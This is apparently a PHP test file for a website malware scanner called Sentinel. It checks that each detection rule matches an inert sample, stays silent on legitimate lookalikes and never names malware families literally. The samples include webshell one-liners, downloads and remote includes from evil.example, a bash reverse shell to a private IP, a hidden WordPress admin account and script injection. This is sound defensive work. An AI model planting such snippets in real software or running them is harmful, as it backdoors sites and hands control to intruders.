<?php
declare(strict_types=1);

use Sentinel\Rules;

/**
 * One sample per built-in rule. Samples are inert text (they are only matched, never run), and
 * names of known malware families are assembled at runtime so this file does not contain them.
 *
 * @return array<string, array{0:string,1:string}> rule id => [sample, file extension]
 */
function signatureSamples(): array
{
    $hex = '"\x73\x79\x73\x74\x65\x6d"'; // literally backslash-x text, as it appears in a malicious file
    return [
        'eval-request' => ['<?php @eval($_POST["p"]);', 'php'],
        'exec-request' => ['<?php system(stripslashes($_GET["c"]));', 'php'],
        'request-callable' => ['<?php $_GET["f"]($_GET["a"]);', 'php'],
        'callback-request' => ['<?php call_user_func($_REQUEST["f"], $_REQUEST["a"]);', 'php'],
        'create-function-request' => ['<?php $f = create_function("", $_POST["code"]);', 'php'],
        'preg-pattern-request' => ['<?php preg_replace($_GET["p"], $_GET["r"], "x");', 'php'],
        'include-request' => ['<?php include($_GET["page"]);', 'php'],
        'write-file-request' => ['<?php file_put_contents($_POST["n"], $_POST["d"]);', 'php'],
        'upload-as-requested-name' => ['<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]);', 'php'],
        'eval-request-variable' => ['<?php $c = $_POST["c"]; eval($c);', 'php'],
        'remote-code' => ['<?php include "http://evil.example/x.txt";', 'php'],
        'shell-download' => ['<?php exec("wget http://evil.example/x -O x.php");', 'php'],
        'eval-decoder' => ['<?php eval(gzinflate(base64_decode("abc")));', 'php'],
        'eval-decoded-variable' => ['<?php $p = base64_decode("ZWNobyAx"); eval($p);', 'php'],
        'eval-closing-tag' => ['<?php eval("?>" . $payload);', 'php'],
        'escaped-function-name' => ['<?php $f = ' . $hex . '; $g = "sys\x74em";', 'php'],
        'reversed-function-name' => ['<?php $f = strrev("tressa");', 'php'],
        'rot13-function-name' => ['<?php $f = str_rot13("onfr64_qrpbqr");', 'php'],
        'split-exec-name' => ['<?php $f = "sys" . "tem"; $f($x);', 'php'],
        'split-decoder-name' => ['<?php $d = \'base64\' . \'_decode\';', 'php'],
        'obfuscator-variables' => ['<?php $OOO0000O0 = "x";', 'php'],
        'globals-function-table' => ['<?php $GLOBALS["a1"][3]($x);', 'php'],
        'encoded-payload' => ['<?php $x = gzinflate(base64_decode("' . str_repeat('QUJD', 150) . '"));', 'php'],
        'chr-chain' => ['<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(41).chr(59);', 'php'],
        'eval-variable-chain' => ['<?php eval($a($b($c)));', 'php'],
        'preg-replace-eval' => ['<?php preg_replace("/.*/e", $x, $y);', 'php'],
        'include-image' => ['<?php @include "wp-content/uploads/favicon_1a2b.ico";', 'php'],
        'include-escaped-path' => ['<?php @include "\x2f\x68\x6f\x6d\x65/x";', 'php'],
        'hardcoded-user' => ['<?php wp_create_user("adminbackup", "Sup3rS3cret!", "a@b.example");', 'php'],
        'hardcoded-user-password' => ['<?php wp_insert_user(array("user_login" => "x", "user_pass" => "Sup3rS3cret!", "role" => "administrator"));', 'php'],
        'hidden-admin' => ['<?php $q->query_where = str_replace("WHERE 1=1", "WHERE 1=1 AND {$wpdb->users}.user_login != \'adminbackup\'", $q->query_where);', 'php'],
        'hidden-plugin' => ['<?php unset($plugins[plugin_basename(__FILE__)]);', 'php'],
        'fake-theme-modules' => ['<?php include "' . 'wp-' . 'vcd.php";', 'php'],
        'webshell-family' => ['<?php $default_action = "Files' . 'Man";', 'php'],
        'reverse-shell' => ['<?php exec("bash -i >& /dev/' . 'tcp/10.0.0.1/4444 0>&1");', 'php'],
        'cryptominer' => ['var m = new Coin' . 'Hive.Anonymous("k");', 'js'],
        'js-eval-charcodes' => ['eval(String.fromCharCode(97,108,101,114,116));', 'js'],
        'js-unescape-script' => ['document.write(unescape("%3C%73%63%72%69%70%74"));', 'js'],
        'js-encoded-script-loader' => ['var s=document.createElement("script"); s.src=atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvai5qcw=="); document.head.appendChild(s);', 'js'],
        'js-long-charcodes' => ['var t = String.fromCharCode(' . implode(',', array_fill(0, 45, 101)) . ');', 'js'],
        'script-from-ip' => ['<?php echo \'<script src="http://203.0.113.5/j.js"></script>\';', 'php'],
        'gambling-spam' => ['<a href="x">Daftar slot ' . 'gacor hari ini</a>', 'html'],
        'hidden-pharma-spam' => ['<div style="display:none">cheap ' . 'via' . 'gra online</div>', 'html'],
        'mailer-request' => ['<?php mail($_POST["to"], "s", "b");', 'php'],
        'file-op-request' => ['<?php unlink($_GET["f"]);', 'php'],
        'connect-request' => ['<?php $h = fsockopen($_GET["host"], 80);', 'php'],
        'extract-request' => ['<?php extract($_REQUEST);', 'php'],
        'disable-error-log' => ['<?php @ini_set("error_log", NULL);', 'php'],
        'htaccess-handler-write' => ['<?php file_put_contents(".htaccess", "AddHandler application/x-httpd-php .jpg");', 'php'],
        'test-marker' => ['<?php // SENTINEL-TEST-MALWARE-MARKER', 'php'],
    ];
}

t('Every built-in rule detects its sample, and every sample has a rule', function () {
    $rules = Rules::builtin();
    $ids = array_column($rules->patterns, 'id');
    $samples = signatureSamples();
    assertSame([], array_values(array_diff($ids, array_keys($samples))), 'rules without a sample');
    assertSame([], array_values(array_diff(array_keys($samples), $ids)), 'samples without a rule');
    foreach ($samples as $id => [$text, $ext]) {
        $hit = array_column($rules->matchContent($text, $failed, $ext), 'id');
        assertTrue(in_array($id, $hit, true), "$id did not match its sample: $text");
    }
});

t('Built-in rules stay silent on legitimate lookalikes', function () {
    $rules = Rules::builtin();
    $legit = [
        ['<?php $body = file_get_contents("php://input"); $json = json_decode($body);', 'php'],
        ['<?php $fh = fopen("php://input", "r");', 'php'],
        ['<?php $pdo->exec($sql); $out = curl_exec($ch); $this->assert($x); Foo::system($y);', 'php'],
        ['<?php include get_template_directory() . "/images/icon.svg";', 'php'],
        ['<?php $hdr = chr(5) . chr(0) . chr(1) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0);', 'php'],
        ['<?php $ids = array_map("intval", $_POST["ids"]); $clean = array_filter($_POST);', 'php'],
        ['<?php if (function_exists("base64_decode")) { $data = base64_decode($raw); }', 'php'],
        ['<?php $O0 = 1; $OO = 2; $o00o = 3;', 'php'],
        ['<?php $user_id = wp_create_user($username, $password, $email);', 'php'],
        ['<?php echo "<span style=\'text-indent:-9999px\'>Skip to content</span>";', 'php'],
        ['<?php $page = sanitize_key($_GET["page"] ?? ""); include __DIR__ . "/views/" . $page . ".php";', 'php'],
        ['<?php wp_enqueue_script("app", "https://cdn.example.com/app.js"); $s = "system" . "_status";', 'php'],
        ['var el = document.createElement("script"); el.src = "https://www.googletagmanager.com/gtag/js";', 'js'],
        ['<?php $label = __("Slot", "theme") . " " . __("booking", "theme");', 'php'],
        ['<?php mail($to, $subject, $message, $headers);', 'php'],
        ['<?php $date = strrev($s); $r = str_rot13($t);', 'php'],
    ];
    foreach ($legit as [$text, $ext]) {
        $hit = array_column($rules->matchContent($text, $failed, $ext), 'id');
        assertSame([], $hit, "false positive on: $text");
    }
});

t('Rules can be limited to file types: PHP-only rules ignore JavaScript', function () {
    $rules = Rules::builtin();
    $php = '<?php @eval($_POST["p"]);';
    assertTrue(in_array('eval-request', array_column($rules->matchContent($php, $f, 'php'), 'id'), true));
    assertTrue(in_array('eval-request', array_column($rules->matchContent($php, $f, 'inc'), 'id'), true));
    assertSame([], array_column($rules->matchContent($php, $f, 'js'), 'id'));
    assertThrows(InvalidArgumentException::class, function () {
        Rules::fromArray(['patterns' => [['id' => 'x', 'severity' => 'warning', 'regex' => '/x/', 'files' => 'docx']]]);
    });
});

t('The built-in rules never contain the literal names of the malware they detect', function () {
    // Hosting providers scan accounts for such strings and could quarantine Sentinel itself.
    $raw = (string)file_get_contents(dirname(__DIR__) . '/rules/builtin.json');
    foreach (['Files' . 'Man', 'c99' . 'shell', 'r57' . 'shell', 'b374' . 'k', 'Indo' . 'Xploit', 'wp-' . 'vcd', 'WP_V' . '_CD', 'coin' . 'hive', 'crypto' . 'night', 'webmine' . 'pool', 'wso' . 'Ex', 'WSOset' . 'cookie', 'sbo' . 'bet', 'gac' . 'or'] as $name) {
        assertTrue(stripos($raw, $name) === false, "rules/builtin.json contains $name");
    }
});

t('rules/builtin.json is exactly what rules/generate.php produces', function () {
    $file = dirname(__DIR__) . '/rules/builtin.json';
    $before = (string)file_get_contents($file);
    $r = Sentinel\Proc::run([PHP_BINARY, dirname(__DIR__) . '/rules/generate.php'], 60);
    assertSame(0, $r['exit'], $r['err']);
    $after = (string)file_get_contents($file);
    file_put_contents($file, $before);
    assertSame($before, $after, 'run php rules/generate.php and commit the result');
});

t('A built-in rule never fails on a large file (no catastrophic backtracking)', function () {
    $rules = Rules::builtin();
    $big = '<?php ' . str_repeat('$a = "' . str_repeat('x', 200) . '"; chr(65) . ', 5000) . str_repeat('A', 200000);
    $t0 = microtime(true);
    $failed = [];
    $rules->matchContent($big, $failed, 'php');
    assertSame([], $failed);
    assertTrue(microtime(true) - $t0 < 5.0, 'took too long');
});
